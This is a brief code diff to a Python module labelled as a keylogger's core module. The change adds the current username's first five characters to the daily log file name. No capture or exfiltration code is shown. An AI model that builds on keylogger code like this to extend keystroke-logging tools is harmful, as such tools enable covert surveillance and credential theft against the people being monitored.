@@ -3,6 +3,7 @@
 键盘记录器核心模块
 """
 
+import getpass
 import sys
 import threading
 import time
@@ -196,7 +197,9 @@ def create_log_file(log_dir: Path = None) -> Path:
     log_dir.mkdir(parents=True, exist_ok=True)
 
     date_str = datetime.now().strftime("%Y%m%d")
-    log_file = log_dir / f"recording_{date_str}.log"
+    username = getpass.getuser()
+    user_prefix = username[:5] if username else "user"
+    log_file = log_dir / f"{user_prefix}_recording_{date_str}.log"
 
     import platform
     try:
